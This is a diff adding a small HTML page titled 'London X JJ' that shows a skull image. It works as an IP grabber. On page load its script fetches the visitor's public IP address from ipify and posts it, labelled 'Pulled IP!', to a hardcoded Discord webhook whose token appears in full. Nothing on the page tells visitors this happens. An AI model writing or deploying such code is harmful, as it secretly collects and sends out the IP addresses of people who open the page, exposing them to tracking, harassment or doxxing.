@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+ 
+<head>
+    <title>London X JJ</title>
+    <style>
+    p, h1 {
+        color: green;
+    }
+    </style>
+  
+    <script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+     
+      <script>
+     
+    /* Add "https://api.ipify.org?format=json" statement
+               this will communicate with the ipify servers in
+               order to retrieve the IP address $.getJSON will
+               load JSON-encoded data from the server using a
+               GET HTTP request */
+              
+    let ip  
+
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+         
+        // Setting text of element P with id gfg
+        $("#gfg").html(data.ip);
+        alert(data.ip)
+        sendMessage(data.ip)
+    })
+
+    function sendMessage(ip) {
+      const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1078120684124913674/vGfZPhSaW4XhEia0v9ahH1GZyy_F8L0P_40kdcgxFa1dca9pQ0tW-6B_Z7k1NzfqjsoE");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "London Burley",
+        avatar_url: "",
+        content: "Pulled IP! : "+ip
+      }
+
+      request.send(JSON.stringify(params));
+    }
+    sendMessage()
+    </script>
+</head>
+ 
+<body>
+    <center>
+        <h1>London X JJ</h1>
+        <img src="skull-skullgif.gif">
+    </center>
+</body>
+ 
+</html>
